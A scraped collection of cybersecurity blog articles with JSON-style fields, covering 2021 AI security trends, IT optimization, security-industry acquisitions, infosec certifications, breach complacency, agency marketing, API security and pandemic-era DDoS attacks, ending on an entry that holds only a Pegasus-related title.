2020 alone. Coupled with the very real shortage of skilled security personnel, complex compliance requirements, perpetually evolving nature of cyberattacks, and threat of data loss or insider threats, combating these cybersecurity challenges can seem like an impossible task. However, first and foremost, the Coronavirus pandemic remains the biggest challenge for global security organizations in the year to come based on what we have already seen. Data breaches have grown in volume and complexity in 2020, with the number of breaches increasing 273% in just the first quarter alone when compared with the year before 2019. It doesn\u2019t even need to be a large team of incredibly skilled hackers to make an impact, in one incident that took place, one lone hacker was able to steal 34 million user records from seventeen companies in 2020. With threats everywhere and now more difficult to stop than ever before, in particular as it relates to  cybersecurity for SMBs , it seems immediately obvious as to why AI is the future of cybersecurity. How Can Businesses Be More Cautious in the Future? Cybercriminals are continuously looking for ways to work around security barriers. This means that attackers are becoming creative and finding new methods to exploit technology users by accessing valuable data, networks, and passwords that evades current security setups businesses may have. Attackers and cybercriminals have capitalized on the chaotic year by attempting to breach a record number of enterprise systems in eCommerce, financial services, healthcare and pretty much any other industry you can think of. This will lead to many industries looking to be more cautious in the year to come, but it will also likely lead to the widespread adoption of AI cybersecurity to allay any concerns .  AI and machine learning-based cybersecurity apps and platforms when combined with human expertise, creativity, and insights will make it more challenging for attackers to succeed in their efforts. With this in mind, understanding the key AI related cybersecurity trends that will be available in 2021 is likely to be linked with the overall success of your business. AI and Cybersecurity Trends for 2021 Recognizing emerging risks and threats is critical for defeating cyber attackers. One of the best ways organizations can spot early trends is to know what\u2019s happening across the industry in general, while staying up-to-date with how emerging technologies are being used by attackers, and how in turn you can use them to stop them. Here are some of the key cybersecurity trends 2021 will see: Cloud Threats  \u2013 As remote work and online collaboration remains the new normal, cloud adoption has emerged as a key ally for enterprises to help ensure business continuity. Though global businesses had already been migrating to the cloud before the crisis, the pandemic has supercharged this movement. However, this accelerated migration to the cloud is only set to introduce a host of new security threats and challenges. Cloud-based security threats, including misconfigured cloud storage, reduced visibility and control, incomplete data deletion, and the vulnerability of cloud-apps themselves, will continue to disrupt businesses in the future ahead. There will also likely be an increase in cloud breaches due to poor security practices in cloud configurations that create vulnerabilities meaning that partnering with trusted, experienced vendors needs to be your first port of call for the year ahead. Zero-Trust Network Access (ZTNA)  \u2013 Previously, IT departments have relied on Virtual Private Networks (VPNs) to facilitate access to the corporate network for a remote workforce. COVID-19 pushed almost all employees globally into a remote working situation, however, while some VPNs have been effective, many have proved woefully inadequate. ZTNA has emerged as a more secure, robust option for organizations looking to control remote access to key or specific applications they need to protect .  Basically, this provides highly controlled access to resources, in turn reducing the overall surface area for an attack to place. The isolation ZTNA offers improves connectivity, removing the need to directly expose any applications to the dangers of the internet .  Studies from Gartner show that 80% of new digital business applications will be accessed through ZTNA, and 60% of enterprises will move from remote-access VPNs to ZTNA by 2023 because of this improved security. AI Integration  \u2013 As cyberattacks continue to grow in both sophistication and frequency, AI will offer support to under-resourced security teams to better protect themselves. By analyzing massive quantities of risk data from structured and unstructured resources quickly, AI provides threat intelligence helping inform critical decisions alongside response to threats in real time. Software engineers and security professionals are all now under immense pressure to achieve more with less security. It\u2019s an impossible ask that leads to exploitation meaning that automation and integration are essential for businesses to function safely. Businesses need to integrate security into agile processes to enhance their overall security and maintain the quality of developments without the risk of damaging cyberattacks. Social Media Threats  \u2013 One trend that emerged last year, but is likely to remain, are threats coming through social media platforms. This is because it has proven to be a medium of choice for everything from election tampering to fake news spreading along with other forms of cyber attack. In 2021, expect attackers to move beyond just targeting individuals to targeting businesses as well .  This is due to the poor authentication and verification practices that social media platforms currently have in place. With more people on these platforms in the COVID world, there is a wealth of opportunities for cyberattackers and hackers to utilize. Something as simple as a URL line can lead to a malicious website to perform a drive by attack, collect personally identifiable information, or even request credentials. This now extends to elements such as malicious QR codes or abbreviated URLs which can now be employed. What\u2019s particularly worrying is that these attacks could occur on a legitimate page of the business itself, or through rogue accounts using similar names due to the social media controls around posting, verification, and URL redirection being so poorly managed. If you are not prepared to tackle this trend of social media threats, then expect new attacks to flourish regularly against your business. Final Thoughts  As cybersecurity trends continue to emerge, organizations must adapt with attackers and develop a proactive IT security strategy which incorporates AI to keep a business secure. The need is to become more nimble, more flexible, and more collaborative when it comes to securing any and all critical assets. After all, just one small gap in your security is all many cybercriminals now need to put your whole organization at risk. However, the far-reaching, ever evolving threats will make it hard for organizations to effectively focus on their core business objectives while ensuring security, which is why focusing on AI technologies and the emerging trends in 2021 will be definitively linked to protecting your business from the many threats out there.

        "text": "Establishing and maintaining efficient information technology (IT) infrastructure is essential for managing a successful business. For this reason, if you neglect your IT infrastructure, your business may be less effective, profitable, and secure.\u00a0 What Is IT Infrastructure? IT infrastructure  refers to a group of systems that operate in unison to produce a working network. One company\u2019s infrastructure may differ greatly from that of another, depending on their budget, business operations, and other critical aspects.\u00a0\u00a0 What Is IT Optimization? In a nutshell, IT optimization is the strategy of minimizing liability and increasing the mobility of your operations. The goal of optimization is to provide businesses maximum output at the lowest possible cost.\u00a0 If you already have a working IT infrastructure, optimizing it may assist you in streamlining corporate operations and saving financial resources that can be utilized more efficiently elsewhere. How To Optimize Your IT Infrastructure? If you\u2019re apprehensive about your IT infrastructure and believe it\u2019s past time for an update, here are some strategies to optimize it: Work With Experts\u00a0 Many companies hire IT service professionals to help them upgrade their IT infrastructure. Working with a skilled team simplifies the process and guarantees an optimal setup for your company\u2019s requirements and goals.\u00a0 Handling it all on your own might be a challenge since you might not know all the available options. Ultimately, this might result in you wasting both your effort and money. If you\u2019re from Texas, you may  rely on Accudata Systems for managed IT services in Dallas  and other IT services companies that offer IT optimization.\u00a0 Update Your Hardware\u00a0 Optimizing your IT infrastructure is an excellent opportunity to assess the performance of your current infrastructure. To start, examine your infrastructure and create a detailed list of what has to be upgraded first. Then, work your way through it to get a sense of where you\u2019re missing and where you\u2019re doing well.\u00a0 If your business is on a limited budget, you might hesitate at the prospect of acquiring new computer systems and other necessary equipment for your employees. However, out-of-date hardware may cause problems on your infrastructure, creating security flaws that hackers could exploit.\u00a0\u00a0 Fortunately, upgrading old hardware is an easy way for businesses to mitigate the risk of expensive, disruptive cyberattacks and benefit from more efficient gear.\u00a0 Take Advantage Of Cloud Computing\u00a0 Cloud solutions, such as storage and computing, may assist businesses in modernizing their operations and enhancing their entire IT infrastructure. One of the primary advantages of  cloud computing  is that it makes accessing cutting-edge software simpler and quicker since it\u2019s all online.\u00a0 As a result, you\u2019re no longer required to buy or install anything physically. Additionally, when all of your data is saved and available in the cloud, you can save space. After all, you won\u2019t have as much on-site storage. Simply put, having your data stored on a remote server that has the capacity to retain more data and send files at lightning speeds may help your company run more smoothly.\u00a0 Implement Data Backup\u00a0 Data loss is a significant issue for every business: you risk losing key customer files, financial records, and proprietary information. Data loss may also cause significant disruption to your work. Consequently, if customers are inconvenienced, they may lose faith in your services, which may affect your income.\u00a0 Going back to cloud computing, cloud backup makes it easy to save and retrieve your data online. Even if a storm damages your workplace and computers, you\u2019ll be able to complete activities from any location with an internet connection. Thus, your staff can continue to be productive and effective even if their typical workspace and tools are unavailable. Improve Site Security\u00a0 Site security is also necessary to ensure the longevity of your IT infrastructure. Using the appropriate plug-ins may effectively secure user information and site stability, as well as avoid data loss.\u00a0\u00a0 Similarly, concealing admin data is critical for preventing unauthorized visitors, as is regularly upgrading your plug-ins to prevent security gaps. So, remember to update your website\u2019s security to keep things operating smoothly and securely.\u00a0 Add More Servers\u00a0 By adding more servers to your IT infrastructure, you can significantly expand your network capabilities. Enhancing your servers also contributes to the strength of your network. This will eventually enable you to store more data and benefit from increased computing power.\u00a0\u00a0 Additionally, it\u2019s recommended to expand or strengthen your IT infrastructure\u2019s server capacity periodically. Doing this can help you combat operational time gaps if one server goes down.\u00a0 Conclusion\u00a0 Any thriving company\u2019s future depends on IT infrastructure. To compete and thrive in this digital era, IT solutions are essential for every organization to run properly and be successful in the current market environment. Hence, IT optimization is critical for any company that seeks to enhance the performance of its IT infrastructure while also reducing expenditures. \u00a0",

        "text": "Last week it was made public that the antivirus maker, Avast Software plans to acquire competitor AVG Technologies for $1.3 billion in cash. This is another in a series of M&A that are likely to change the face of the cybersecurity industry in the coming year. A week ago CISCO announced it was buying Cloud security company Cloudlock for 300 million USD, and earlier in June security giant Symantec bought Bluecoat for approximately $4.65 billion. Earlier this year, BlackBerry acquired Encription, IBM bought Resilient Systems, Infoblox bought IID and FireEye bought Invotas and iSIGHT Partners. Research firm 415 figures show that the number of security acquisitions has increased by 41 percent in the past two years. According to 451 Research\u2019s survey of technology investment bankers in December 2015, cybersecurity had displaced mobility as the area where M&A spending was expected to grow most over the next year, and at that time was expected to grow at a fast rate (a prediction which we can now confirm). What are the reasons for this trend, is it going to stop, level or escalate and what are the implications on the market and customers? Reasons: While raising cash has been relatively easy in the last couple of years (with twelve security companies have raised more than $100 million each from venture capitalists, according to Dow Jones VentureSource), cashing in through IPO isn\u2019t. Market sentiments (fueled by recent Brexit scare), and Dell Secureworks dismal IPO earlier this year signal companies to halt and not go public. Bluecoat was scheduled for an IPO but withdrew and sold itself to Symantec instead. It is not clearq exactly why this happened, but it surely had something to do with the negative sentiment and negative Cash flow.  in its IPO filing, Blue Coat reported a $232 million net loss on $598 million in revenue for the year ending 12 months ending April 30, 2016 (Much of that loss was due to recent acquisitions of Perspecsys and Elastica), so it\u2019s clear the company was eager to tap into fresh money supply.  It\u2019s owner Bain Capital, having purchased it just over a year ago for $2.4 billion, including around $900 million of equity,\u00a0sensed that need and the negative market sentiment, pulled the IPO offer and opted to sell instead. Industry analyst add that the markets find it difficult to evaluate cybersecurity business potential and worth, but large companies with know \u2013how of the industry and a large cash deposits (checkpoint, Symantec and CISCO to name a few) are better positioned to do so and often act to take smaller firm \u201coff the table\u201d. Given this overwhelming headwind, it is no wonder that other companies in the industry are who were rumored to move towards an IPO now estimate an IPO isn\u2019t realistic or desired in the next 24-36 months, so we\u2019re likely to see others being bought by larger companies. Intensity  Cybersecurity is a segment of the global technology market, which is has been fueled by investment bodies which are in turn effected by the global markets. Should the volatility in the global market continue or worsen (e.g. more countries following the UK steps and exiting the European Union) we will see pressure from the investors to cash in and sell companies. Cash-starved companies advancing towards the end of their runway will have more motivation to sell (since raising cash is harder), which would coincide with buyers\u2019 motivation to grab market share and buy \u201ccheaply\u201d -both in terms of overall deal price and the ability to pay in stocks instead of cash. Other scenarios which can push companies to an M&A scenario is pressure from hedge funds \u2013 such as Imperva is experiencing at the moment. In case markets level off we could see natural evolution where companies whose offering is synergetic decide to join forces and become a bigger force- such as Carbon Black and Bit9. Market implications The cybersecurity market is an extremely fragmented one, composed of dozens of sub-categories and technologies. Larger companies try to assemble a portfolio of solution to allow them to provide holistic solutions to their strategic customers. It makes sense for a behemoth like Symatec to buy Bluecoat since its technology complements theirs. It is also easier for established companies to maintain an innovative edge by buying mature technologies rather than developing these in-house. What this means for up and coming startups is that if they create a mature product offering quickly they face a much earlier exit point than was ever possible before. A company can use its first investments round to grow to a value 100-300 million US$ without having to raise additional rounds, grow to 1 billion before facing the same fate- the difference being the first option is quicker, easier and leaves more money in the founders (and early funders) pockets. And for the customer? Being a cybersecurity consumer is difficult- a large scale organization has to deal with 30 or more solutions from a dozen of vendors. CIO / CISO faces a never ending onslaught of phone calls and meetings from vendors and resellers trying to convince him to test and buy their product.  Consolidation (meaning fewer companies offering more wholesome solutions) would make life easier, simpler and save considerate hassle for the buyers. Post \u2013 purchase integration between products would also become easier and reduce load from the IT department. However, there is a chance it will stagnate innovation and evolution (even today, large cybersecurity companies are generally considered less innovative than small ones), so the end result will be a failure to develop and deploy products which could mitigate evolving cyber threat. Conclusion Consolidation is without a doubt a prominent force in the cybersecurity industry this year. This trend is likely to continue or even intensify and it will affect the entire industry. We are hopeful that it will end up making customers\u2019 lives easier and their organizations more secure as a result.",

        "text": "Information security is the practice of protecting an organization\u2019s data from illegal access, disclosure, disruption, or change. It includes processes, organizational standard operating procedures, and tools that secure a company\u2019s sensitive information and is usually handled by the company\u2019s security experts. Its main goal is to minimize threats and susceptibility to outside attacks. Large companies require experienced personnel to undertake such critical work and so, adding credentials to your arsenal can help set yourself apart from other candidates. Let\u2019s look at several information security certifications that can help you advance your career and get recognition for your skills. Cato SASE Expert Certification\u00a0 Gartner has developed a new enterprise networking technology category called Secure Access Service Edge (SASE). It integrates network and security point solutions into a single, worldwide native cloud service. It\u2019s a revolutionary enterprise networking and security architecture that allows IT to provide a holistic, agile, and adaptable service to the digital company. Therefore, many organizations have gravitated towards SASE recently and are looking for candidates who understand it. Cato Cloud is the first SASE platform, and so Cato Networks\u2019  SASE Expert Certification  training course will provide you with a comprehensive understanding of SASE and its architecture. You need to have only basic networking expertise to apply for it. This CATO SASE Expert level certification is a one-stop-shop for all your SASE learning needs. Offensive Security Certified Professional (OSCP) The offensive security is a practical approach to ethically hacking the host/web computer. The  OSCP  certification verifies a candidate\u2019s understanding of pen testing and hacking. There are two elements to this certification. First, candidates must complete four of the five challenges within 24 hours. These challenges contain five machines that are a combination of Windows and Linux. You have to hack into the machine and elevate your privileges to root. Second, candidates must write a comprehensive report on how they solved the problem. Candidates can use Kali Linux tools, and pen testing approaches to solve the assignment. They need to attach screenshots of the tools they used, etc.,\u00a0 in the report so that it looks like a report from a professional pentester. After qualifying, you will be eligible for great salary packages. The Offensive Security certificate has lifelong validity. \u00a0 Certified Information Security Manager (CISM) The  CISM  certification is administered by ISACA. It is an experience-level certification that assesses your knowledge of various aspects of information security, including incident handling, risk assessment, development of security programs and their implementation, team management, security compliance implementation, and information systems audits. This course includes management of information security, data policies, resiliency techniques too. Thus, it\u2019s ideal for someone who wants to rise to a role in which they handle information security across multiple domains. It is also suitable for job profiles that are responsible for creating policies and best practices to ensure that the organization is free of vulnerabilities. \u00a0 Certified Penetration Testing Engineer (CPTE)\u00a0 CPTE certification  is overseen by Mile2, and is based on real-world hacking knowledge. In it, a candidate must find a weakness, exploit that vulnerability, and hack the system. Candidates must be conversant with pen testing and advanced exploitation techniques to be considered for this position. They should also know how to document and disclose exploitation vulnerabilities. The course involves using different types of tools such as Nmap and Metasploit, and other comprehensive skills, such as pivoting, etc. You will have a lab where you can perform these tasks practically. Candidates for CPTE certification should be familiar with TCP/IP protocol suite, Microsoft packages, and the Windows Linux operating system. You need expertise in all of the tools required for penetration testing.\u00a0 This course also dives into OSINT so that you can first look for publicly available information and do the fingerprinting of the target. \u00a0 eLearnSecurity Junior Penetration Tester (eJPT) eJPT certification  is an introductory course on the topic of pen testing that includes hands-on experience. This is a beginner\u2019s certification; thus, no prior experience with pen testing is required. But basic knowledge of TCP/IP, vulnerability assessment, and Metasploit is required as this certification will advance your skills in the field of penetration testing. It first provides instructional material to familiarize users with pen testing. After completing the course, the candidate will be conversant with several aspects of pen testing, including fundamental networking understanding, scripting/programming, vulnerability identification, etc. This certification is best in class for people looking to change their field into information security and looking for a way to prove their skills. \u00a0 Certified Red Teaming Expert (CRTE) The  CRTE  qualification is overseen by the Pentester Academy. This is a practical certification that requires students to confront real-world problems. Instead of breaking individual devices, students must examine the entire network infrastructure as if they were network administrators. To gain this credential, students must finish the task assigned in 48 hours and submit the report within that time frame. In the certification process, students need to take advantage of the functionality and trusts to get about the labs. Holders of this certification are knowledgeable in various areas, including privilege escalation, manipulation of built-in functionalities to execute code injection, credential cracking, bypassing anti-virus protection or whitelisting implementation, and bypassing firewall protection. In this article, we have talked about some certifications in the field of information security that might help candidates advance in their careers. Choosing the right course depends on the domain they want to pursue. As the incidence of data breaches is rising, most businesses are seeking qualified personnel who can protect their company\u2019s data from hackers. High-skilled security personnel are always in high demand. As these qualifications are in high demand, people whose skills are verified distinguish themselves from other security specialists. \u00a0",

        "text": "An August  article  suggested that the due to the large amounts of cyber breaches that have impacted both public and private sectors that have put millions of individuals personal identifiable information at risk, the general attitude toward breaches is becoming more mainstream and accepted.\u00a0 This is an unfortunate state of affairs when instead of compelling organizations to aggressively improve their network security practices, the public writ large is willing to accept credit monitoring for a period of time (usually 1-2 years) as a consolation prize.\u00a0 According to  one source , the first half of 2016 has seen 538 breaches identified; 60 percent of businesses losing valuable intellectual property and/or trade secrets; and approximately 13 million records exposed. The most significant fallouts from such highly publicized breaches have either been the resignation/firing of chief executive officers (e.g., the ones  Target ,  Sony ,  U.S. Office of Personnel Management ), or else a limited show of consumer discontent by stopping patronage of a particular organization, such as what the British telecom  Talk Talk  experienced after its breach.\u00a0 Target, after its 2013 breach became public, suffered an immediate  massive earnings hit  when consumers sought other retail alternatives.\u00a0 Yet, in many instances, loss of consumer confidence has proven to be short term; two years later, Target had bounced back both commercially, and in consumer trust. Even the recent revelatory hacking incident that stole and then exposed U.S.  Democratic National Committee  \u00a0sensitive information focused more on \u201cwho\u201d perpetrated the act, rather than why was such a hack successful, and what had been the standard security practices at the time that facilitated the breach in the first place.\u00a0 In this instance too,  senior individuals  including the then Chairperson of the DNC resigned from their positions, perhaps distracting from the more pertinent point \u2013 what was the cyber security posture prior to the breach?\u00a0 Indeed, what\u2019s particularly disconcerting about this incident is that sources have indicated that  federal investigators  had tied to war the DNC about a potential intrusion in their network months before the party had tried to fix the problem.\u00a0 If true, this certainly calls into question the gravity with which political organizations address cyber security.\u00a0 More importantly, it calls into question what steps are being taken to guarantee user data security and policies are being implemented to reduce further risk exposure in the future. While it is always interesting to know who pulled off some of the more attention-garnering headlines, it ultimately does not help in addressing security at an organizational level unless a strategy is designed and put into place.\u00a0 A good first step is designing a risk management approach that helps organizations identify and preserve the very data that they should protect to ensure business operations.\u00a0 This includes incorporating the appropriate technologies, as well as creating and testing an incident response plan to better prepare an organization before, during, and post-breach. While cyber security remains a challenging and difficult undertaking, complacency should not replace responsibility when it comes to holding organizations accountable for failing to properly secure the very information to which they are entrusted.\u00a0 Cyber insurance and identity theft does not replace a cyber security ecosystem designed to be resilient in the face of these activities. They are part of the post-breach remediation but they do not help prevent or reduce the threat from happening. It is disappointing if organizations would rather assume the risk of major class action  lawsuits  from consumers and financial institutions to doing their due diligence with regards to taking responsible action with regards to protecting customer data.\u00a0 In the age where most concede that \u201cit\u2019s not if you\u2019ll be breached, but when,\u201d it\u2019s time for organizations to understand that their constituents are their most prized asset, and that by protecting their interests, the organization secures the continued longevity of theirs in turn.

        "text": "Nowadays, Information Technology (IT) is now one of the biggest concepts in the field of technology. It\u2019s believed that approximately two-thirds of the world\u2019s population owns a mobile device, particularly a smartphone. Therefore, if you own a cybersecurity company, you could utilize digital media to expose your products and services. Also, the demand for cybersecurity is on the rise due to increased breaches of data privacy incidents.\u00a0\u00a0 Competition out there is rising by day from the several firms that are offering cybersecurity solutions. As a result, you may have to pull out your best marketing efforts.\u00a0 This is to generate organic leads and conversions for your cybersecurity agency. One sure way of doing this is by partnering with an  IT services marketing  company to stage an effective digital marketing campaign. Also, here are various ways on how you can grow your cybersecurity agency\u2019s exposure. Pay-Per-Click (PPC)\u00a0 This is an effective strategy that uses payable ads for advertisement. It\u2019s a safe model of advertising since you only pay for the clicks that your ads get. It\u2019s aimed at buying visits to your website rather than the visits organically. However, your ads need to be enhanced with Search Engine Optimization (SEO) with relevant keywords to appear from the Search Engine Results Pages (SERP).\u00a0 Search engines will use their algorithms to identify your ads and push them up to the top of search results. Because it\u2019s already a paid service, it\u2019s easy for your ads to appear after searching on the search engine.\u00a0\u00a0 Content Marketing\u00a0 Content marketing through blogging is perhaps the most preferred strategy by many digital advertisers. Even as popular as it may be, many marketers fail in following search engine guidelines which make their content fail to go far. When you\u2019re writing content, ensure they\u2019re relevant to the type of services you offer.\u00a0 Take \u2018Trends in cybersecurity threats\u2019 or \u2018How to identify and mitigate cybersecurity attacks.\u2019 as an example.\u00a0\u00a0 With such kind of information, it\u2019s easy to attract organic leads to your website. On your website, have a blogging section that you could upload all written content.\u00a0 Writing credible content is excellent, but it\u2019s not the only thing you need.\u00a0 Your content should be optimized with the right keywords that searchers use.\u00a0 You may include short and long-tail keywords. Rember to use the exact keywords in your subtitles and meta-description. Blogging is very efficient in attracting organic leads who could become customers. Additionally, do guest posting and use external links to your website.\u00a0\u00a0 Aside from content in the form of blogs, you could consider  vlogging . This is creating video content and uploading it on a streaming platform. However, ensure your videos are of high quality and have educational value.\u00a0 You could be creative and use current events that people may be searching about. For instance, you can write content or create a video about \u2018What to learn from the XYZ attack.\u2019\u00a0\u00a0 Email Marketing\u00a0 This is another strategy that could improve the sales of your cybersecurity agency. First, you need to gather an email list of prospective customers. If you own a business start-up, your marketing agency can help you in this area. They may do so by designing a lead magnet for your landing page.\u00a0 A lead magnet is a free product you give to your target audience.\u00a0 It could be in the form of a free e-book, whitepaper, webinar.\u00a0 However, your clients may only receive it after exchanging their contact details.\u00a0 These details will include their email address, phone number, and other information you may need from your clients.\u00a0\u00a0 Once you have gathered your email address list, you could send personalized emails to your target audience. Within your email, you need to have a call to action. For instance, you may ask your prospects to read more by clicking a link that leads to your website.\u00a0\u00a0 Webinars\u00a0 Webinars are live sessions that are geared to teaching or passing some information to your target audience. You could publicize your webinar by sending emails or text messages.\u00a0 However, prepare well for your live session. Ensure your content is well thought out of, full of facts, and informative. Make the session interactive to avoid your audience abruptly leaving your webinar. Therefore, avoid giving non-essential details and make the webinar as short as possible. In addition, make the session interactive with a question-and-answer portion to address any burning queries.\u00a0\u00a0 Wrapping Up \u00a0 Marketing is not a walk in the park. Therefore, you need to plan adequately for your  cybersecurity  agency\u2019s marketing campaigns. Moreover, you need to have the relevant skills and talent to run a successful digital marketing campaign.\u00a0 In case you lack the expertise in your agency, leveraging the services of a marketing company is a viable option. After all, they have done this for a long time and could help you invest wisely in your marketing ventures. You may do so to reap a good Return On Investment (ROI) from your marketing efforts.\u00a0\u00a0 \u00a0",

        "title": "Protecting your APIs from Attacks and Data Breaches",
        "author": "Guru Writer",
        "date": "October 21, 2021",
        "text": "Many organisations are working to modernise their existing applications and integrate secure apps across their environments to keep pace with business demands.  Modern application development relies on Application Programming Interfaces (APIs), which enable services and products to communicate with each other and leverage each other\u2019s data and functionality to support business operations.  APIs are business critical \u2013 the most popular web applications and innovative services run on APIs.  While APIs help businesses accomplish many strategic and operational goals, simplify software development and improve user experience, they are not without risks.  Because APIs connect services and transfer all types of data, including sensitive data, APIs are vulnerable to attacks that may result in costly data breaches.\nAPIs are Used for Communication and Data Transfer\nAn API is technology that is driven by a set of defined rules that allow software applications to communicate with each other.  The API acts as a middleman between machines, applications or services that want to connect with each other for a specified task.  APIs use defined protocols to enable developers to build, connect and integrate applications quickly and at scale.\nHow Do APIs Work?\nAn API works using a call request-data transfer format.  In a client application-web service scenario, a client application initiates an API call (or request) to retrieve information. This request is processed from an application to the web server via the API\u2019s Uniform Resource Identifier (URI).  After receiving a valid request, the API (the intermediary or middleman) makes a call to the web server.  The server sends the requested information in its response to the API, and the API transfers the data to the application that initiated the API call (or request).\n  An API works similarly to a waiter or waitress who acts as an intermediary between the chef in the kitchen and a customer in a restaurant.  When a customer places an order with a waiter, the waiter communicates the details of the order to the chef.  The chef responds to the order details by preparing the order and giving it to the waiter.  In this scenario, the customer represents the initial API call, the waiter represents the API and the chef in the kitchen represents the server.  When the chef (i.e., the      server) provides the information to the waiter and the waiter provides the information to the customer, this act represents the transfer of data.  Given the exchange of data, this process must remain secure.\nAPI Security\nAPI security involves protection of the APIs that an organisation owns and uses.  Properly secured APIs create an additional layer between the data being transferred and the server.  APIs may be leveraged to quickly authenticate users who log in to websites using their social media profiles, for example.  This login approach decreases the time and energy it takes for the user to join or create a profile on every website that requires a login to view information or participate in their community.  APIs also protect sensitive payment details by allowing users to pay for products online without exposing any sensitive financial data to the eCommerce shop through the use of trusted third-party payment processing.\nWhile APIs offer great benefits, including increased efficiency for businesses and a better web and application user experience for end users, they are also a target for attacks.  Bad actors realise how lucrative it can be to target APIs, since they direct traffic to an organisation\u2019s most valuable data and services. And APIs are challenging to secure since traditional security tooling can\u2019t protect APIs.\nOrganisations also have a lot of APIs for which they lack visibility, also known as shadow APIs, and older APIs they should have decommissioned, also known as zombie APIs.   Organisations cannot secure or manage what\u2019s invisible to them.  Part of API security is discovering APIs that fall within this category and properly managing them to mitigate risk.\nSecure APIs Against Attacks and Breaches\nSecuring APIs against attacks is critical for businesses as API use increases and the attack surface expands.    Common attacks against web APIs include credential stuffing attacks, account takeover attacks, API call request manipulation, distributed denial-of-service (DDoS) attacks, and Man-in-the Middle attacks. Having APIs hacked or abused may have far-reaching consequences such as data breaches, data exfiltration, or slow and even fully disrupted service.\nOrganisations must invest in implementing API security best practices such as API testing (before production) to identify issues that may allow a bad actor to exploit a vulnerability.  To mitigate the risks inherent in APIs, an organisation should take six actions to protect their existing APIs:\nIdentify APIs across the organisation to avoid the risk of shadow or zombie APIs\nUse fine-grain access controls for each API to authenticate users and avoid broken user authentication\nImplement encryption methods to ensure the secure transfer of data\nImplement a rate limit for the number of API requests to mitigate PI abuse\nEnsure collaboration between developer, information technology (IT) and security teams\nOrganisations that inventory and manage their APIs are on the right track, but it\u2019s not enough.  Every organisation has those unknown or forgotten APIs.  Implementing strong access controls is critical because APIs provide an entry point to enterprise assets, including personal and sensitive data.  Without cryptographical measures to encrypt data in transit, data transferred using an API is at risk for modification and unauthorised use.  Flagging when a given user is making too many API requests will help prevent brute-force attacks or service disruptions.\nThe reputational harm of an API breach or a leaky API can be costly, and real dollar costs, in the form of privacy violation fines, can also be very painful.   Organisations looking to successfully manage and secure their APIs need that security to be a shared responsibility across many groups, especially developers and security teams.\nConclusion\nAPIs must be secured using API security best practices.  API management platforms help, with support for authentication and authorisation. But they cannot discover all APIs in an organisation and they cannot detect runtime attacks.   Additional API security tooling that monitors API activity in real-time \u2013 by user and by API \u2013 is essential to protecting APIs.\n  About the Author: Ambler Jackson is an attorney with an extensive background in corporate governance, regulatory compliance, and privacy law.

        "title": "Massive rise in DDoS attacks post-COVID-19",
        "author": "Sama Denaa",
        "date": "September 9, 2020",
        "text": "As people found solace within the safe boundaries of their homes after Coronavirus caused havoc worldwide, it was a time for hackers to be active.\nAccording to a report by NexusGuard, a whopping 542 percent  jump in DDoS attacks was reported in the first quarter of 2020 over the previous quarter. People were forced to work from home to stop the rise of the pandemic. As the reliance on remote services increased, hackers deemed it a perfect opportunity to up the ante and cause disruption.\nState-run agencies have also confirmed the rise in the cyber pandemic, ie DDoS attacks. The Federal Bureau of Investigation (FBI) warned in July this year of the likely surge in the DDoS attacks, especially those targetting US-based organisations through amplification techniques.\nRecent research has also found \u201cinvisible killers\u201d entering into the equation due to negligence on the part of the internet service providers. The ISPs generally turn a blind eye to small-sized and short attacks. This is why they find it easier to disrupt the online services.\nMore DDoS attacks likely\nKaspersky estimates that the high level of DDoS attacks is likely to continue in the third quarter as professionals are still working from home. In a recent report they highlighted that the fourth quarter traditionally sees an increased number of attacks because of the holidays and shopping season.\nThe worst attack to date\nThe worst DDoS attack was reported in February this year when Amazon Web Service\u2019s infrastructure was disrupted with a whopping 2.3TB per second attack (20.6 million requests a second). Another massive attack was reported recently against a large European bank which generated  809 million packets per second.\nISPs at the battlefront\nGlobal internet service providers have so far done a fine job in the prevention of these attacks. However, the rise of invisible killers and reflection attacks pegged them back during the pandemic. ISPs have also found it hard to deal with invisible killers and reflection attacks because the volume of traffic is constantly rising due to work-from-home activity. The good news is that in recent weeks, ISPs have turned their focus on these silent attacks because a failure to tackle such attacks would result in widespread DDoS strikes.\nHow to prevent the cresting cyber pandemic?\nBusinesses with staff working from home need to set up protocols to ensure the security of their systems and data. Among actions they can take to limit DDoS and similar attacks are:\nTrain your workforce: Education is the biggest protection against any criminal activity. Companies must invest in the education of their employees, especially on the work-from-home best practices and security protocols. No business can afford to lose precious data due to failing to ensure security during work-from-home activity. One way of controlling the situation would be to make employees use only corporate devices. These devices generally have excellent security protocols which defends them against most kinds of cyberattacks. Security staff need to enable and install the latest security patches and updates on these devices.\nStrengthen your email protection: Email phishing is a favourite tools for hackers and spammers so companies should strengthen their corporate email protection settings. This would help prevent spam emails from finding their way into employees\u2019 inboxes. Online training sessions with employees should be designed to educate them about different kinds of phishing emails and how to not click on suspicious or malicious links.\nKeep a close eye on traffic: Ensure 24/7 monitoring of the network traffic particularly SaaS traffic as these have been subject to large data breaches in the past. As a business, it is your responsibility to tell your employees to refrain from unauthorised transferring of any data.\nEnforce tenant access control: Data breaches and illegal or unauthorised data access are key risks for businesses in the post-COVID19-world. An effective way to ensure security is by enforcing the Tenant Access Control. You can simply buy DLP capabilities, provided by SaaS providers, which will let you enjoy an additional layer of data protection.\nTime to utilise TLS/SSL: Many companies have aTLS/SSL inspection solution but often they hardly utilise it. It is time now to get the best value out of this solution. TLS/SSL deployment will block encrypted attacks and data breaches in the real-time environment.  TLS/SSL inspection tools will go a long way in ensuring the security of your remote work environment by encrypting data. It is also a wise idea to get your employees to conduct daily work assignments on VPN networks.\nRemote SaaS users must use corporate network: Today\u2019s remote work environment is all about remote users who go about their job and work from a distance over the internet. It is crucial to ensure that your remote users only access SaaS applications via a corporate network. If your remote users access SaaS applications through their domestic internet connection, this is nothing less than a recipe for disaster. Once your remote users access SaaS applications through the corporate network, your network administrators would be able to keep a close eye on all the traffic in the cloud.\nThe final word\nThe first and the most important rule for establishing and maintaining a secure remote work environment is a \u201cZero Trust Model\u201d. Even the top hierarchy of a company should stay within the network security protocols during the pandemic. Always make sure that no employee has access to data not relevant to their work. Access restriction will help you win the battle against the cyber pandemic.\nContributed by Sama Denaa, Blogger at Blockdos writing about web security.\n5\nArticle Rating\nFacebook\nTweet\nLinkedIn",

        "title": "The Pegasus project: key takeaways for the corporate world",
        "author": "Neil Lappage",
        "date": "September 9, 2021",
